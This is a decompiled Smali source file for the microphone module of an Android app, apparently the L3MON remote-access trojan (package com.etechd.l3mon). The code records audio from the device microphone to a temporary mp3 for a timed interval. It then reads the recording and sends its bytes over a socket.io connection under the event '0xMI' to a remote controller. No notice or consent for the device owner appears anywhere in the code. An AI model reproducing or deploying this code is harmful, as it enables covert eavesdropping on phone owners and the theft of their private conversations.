.class public Lcom/etechd/l3mon/MicManager;
.super Ljava/lang/Object;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/etechd/l3mon/MicManager$100000000;
    }
.end annotation


# static fields
.field static final TAG:Ljava/lang/String; = "MediaRecording"

.field static audiofile:Ljava/io/File;

.field static recorder:Landroid/media/MediaRecorder;

.field static stopRecording:Ljava/util/TimerTask;


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    check-cast v2, Ljava/io/File;

    sput-object v2, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 85
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$1000001(Ljava/io/File;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    invoke-static {v3}, Lcom/etechd/l3mon/MicManager;->sendVoice(Ljava/io/File;)V

    return-void
.end method

.method private static sendVoice(Ljava/io/File;)V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            ")V"
        }
    .end annotation

    .prologue
    .line 66
    move-object v1, p0

    move-object v8, v1

    invoke-virtual {v8}, Ljava/io/File;->length()J

    move-result-wide v8

    long-to-int v8, v8

    move v3, v8

    .line 67
    move v8, v3

    new-array v8, v8, [B

    move-object v4, v8

    .line 69
    :try_start_0
    new-instance v8, Ljava/io/BufferedInputStream;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    new-instance v10, Ljava/io/FileInputStream;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    move-object v12, v1

    invoke-direct {v11, v12}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v9, v10}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    move-object v5, v8

    .line 70
    move-object v8, v5

    move-object v9, v4

    const/4 v10, 0x0

    move-object v11, v4

    array-length v11, v11

    invoke-virtual {v8, v9, v10, v11}, Ljava/io/BufferedInputStream;->read([BII)I

    move-result v8

    .line 71
    new-instance v8, Lorg/json/JSONObject;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

    move-object v6, v8

    .line 72
    move-object v8, v6

    const-string v9, "file"

    const/4 v10, 0x1

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v8

    .line 73
    move-object v8, v6

    const-string v9, "name"

    move-object v10, v1

    invoke-virtual {v10}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 74
    move-object v8, v6

    const-string v9, "buffer"

    move-object v10, v4

    invoke-virtual {v8, v9, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v8

    .line 75
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v8

    invoke-virtual {v8}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v8

    const-string v9, "0xMI"

    const/4 v10, 0x1

    new-array v10, v10, [Ljava/lang/Object;

    move-object v14, v10

    move-object v10, v14

    move-object v11, v14

    const/4 v12, 0x0

    move-object v13, v6

    aput-object v13, v11, v12

    invoke-virtual {v8, v9, v10}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v8

    .line 76
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_2

    .line 82
    :goto_0
    return-void

    .line 76
    :catch_0
    move-exception v8

    move-object v5, v8

    .line 78
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v8

    move-object v5, v8

    .line 80
    move-object v8, v5

    invoke-virtual {v8}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception v8

    move-object v5, v8

    .line 82
    move-object v8, v5

    invoke-virtual {v8}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static startRecording(I)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 30
    move v1, p0

    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v6

    move-object v3, v6

    .line 32
    :try_start_0
    const-string v6, "DIRR"

    move-object v7, v3

    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 33
    const-string v6, "sound"

    const-string v7, ".mp3"

    move-object v8, v3

    invoke-static {v6, v7, v8}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v6

    sput-object v6, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 41
    new-instance v6, Landroid/media/MediaRecorder;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-direct {v7}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    .line 42
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x1

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 43
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x2

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 44
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v7, 0x3

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 45
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v7, Lcom/etechd/l3mon/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 46
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->prepare()V

    .line 47
    sget-object v6, Lcom/etechd/l3mon/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v6}, Landroid/media/MediaRecorder;->start()V

    .line 50
    new-instance v6, Lcom/etechd/l3mon/MicManager$100000000;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-direct {v7}, Lcom/etechd/l3mon/MicManager$100000000;-><init>()V

    sput-object v6, Lcom/etechd/l3mon/MicManager;->stopRecording:Ljava/util/TimerTask;

    .line 61
    new-instance v6, Ljava/util/Timer;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    invoke-direct {v7}, Ljava/util/Timer;-><init>()V

    sget-object v7, Lcom/etechd/l3mon/MicManager;->stopRecording:Ljava/util/TimerTask;

    move v8, v1

    const/16 v9, 0x3e8

    mul-int/lit16 v8, v8, 0x3e8

    int-to-long v8, v8

    invoke-virtual {v6, v7, v8, v9}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :goto_0
    return-void

    .line 33
    :catch_0
    move-exception v6

    move-object v4, v6

    .line 35
    const-string v6, "MediaRecording"

    const-string v7, "external storage access error"

    invoke-static {v6, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 36
    goto :goto_0
.end method
